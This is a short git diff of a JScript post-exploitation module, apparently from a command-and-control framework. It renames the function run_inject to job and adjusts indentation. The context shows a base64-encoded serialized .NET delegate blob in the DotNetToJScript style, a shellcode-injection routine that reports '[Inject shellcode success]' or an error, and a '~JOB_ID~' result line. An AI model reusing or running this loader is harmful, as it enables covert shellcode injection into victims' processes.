@@ -24,7 +24,7 @@ function base64ToStream(b) {
     return ms;
 }
 
-function run_inject() {
+function job() {
     var serialized_obj = "AAEAAAD/////AQAAAAAAAAAEAQAAACJTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVy" +
         "AwAAAAhEZWxlZ2F0ZQd0YXJnZXQwB21ldGhvZDADAwMwU3lzdGVtLkRlbGVnYXRlU2VyaWFsaXph" +
         "dGlvbkhvbGRlcitEZWxlZ2F0ZUVudHJ5IlN5c3RlbS5EZWxlZ2F0ZVNlcmlhbGl6YXRpb25Ib2xk" +
@@ -161,10 +161,10 @@ function run_inject() {
             if (res == 0)
                 return "[Inject shellcode success]";
             else
-            return "[Inject shellcode Error]";
+                return "[Inject shellcode Error]";
         }
     } catch (e) {
         return "[Inject shellcode Error]";
     }
 }
-c = "~JOB_ID~" + "|" + run_inject();
+c = "~JOB_ID~" + "|" + job();
